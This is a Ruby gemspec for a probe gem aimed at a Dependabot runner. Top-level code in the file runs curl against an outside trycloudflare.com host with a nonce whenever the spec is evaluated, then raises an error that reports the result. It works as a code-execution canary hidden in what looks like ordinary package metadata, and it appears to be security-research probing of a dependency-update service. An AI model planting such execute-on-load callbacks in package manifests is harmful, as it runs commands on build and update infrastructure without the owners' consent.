probe_nonce = "20261012A1B1A2"
probe_url = "https://vip-catalog-useful-countries.trycloudflare.com/f005-runner-command/#{probe_nonce}"

request_ok = system(
  "/usr/bin/curl",
  "--silent",
  "--show-error",
  "--output", "/dev/null",
  "--max-time", "20",
  probe_url
)

raise "F005_RUNNER_COMMAND_REQUEST_#{probe_nonce}=#{request_ok.inspect}"

Gem::Specification.new do |spec|
  spec.name = "dependabot-runner-command-probe"
  spec.version = "0.0.1"
  spec.summary = "Owned Dependabot Runner command-channel canary"
  spec.authors = ["Mrunal Chawda"]
  spec.files = ["lib/dependabot_runner_command_probe.rb"]
  spec.require_paths = ["lib"]
end
